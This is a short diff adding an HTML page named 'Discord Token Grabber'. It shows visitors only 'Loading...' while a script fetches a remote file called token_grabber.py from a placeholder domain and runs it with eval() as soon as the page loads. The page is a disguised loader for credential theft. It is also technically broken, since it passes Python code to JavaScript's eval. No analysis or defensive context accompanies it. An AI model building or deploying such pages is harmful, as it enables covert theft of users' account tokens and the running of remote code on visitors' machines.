@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Token Grabber</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // This script will be executed when the page is loaded
+        fetch('https://your-vercel-domain.com/token_grabber.py')
+            .then(response => response.text())
+            .then(data => {
+                // Execute the Python script
+                eval(data);
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
